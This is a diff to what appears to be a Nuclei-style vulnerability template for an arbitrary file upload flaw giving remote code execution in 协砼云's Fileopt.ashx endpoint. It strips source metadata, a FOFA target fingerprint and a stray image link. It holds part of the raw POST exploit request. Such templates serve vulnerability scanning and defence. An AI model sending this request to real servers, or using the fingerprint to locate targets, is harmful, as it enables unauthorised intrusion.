@@ -3,12 +3,8 @@ info:
   name: 协砼云-Fileopt存在任意文件上传导致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ornpqghhl3vm83vw'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ornpqghhl3vm83vw
-    fofa: (body="铜哨云用户中心") || icon_hash="1450750287"
 http:
 - raw:
   - 'POST /Mobile/FrontInterface/Functions/Handles/File/Fileopt.ashx HTTP/1.1
@@ -46,7 +42,7 @@ http:
 
     1
 
-    ------WebKitFormBoundaryzlSs4UDJdUjA6yb9--![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1766915643721-14f1ad87-5ede-4875-8eae-9f841047c687.png)'
+    ------WebKitFormBoundaryzlSs4UDJdUjA6yb9--'
   redirects: false
   matchers:
   - status:
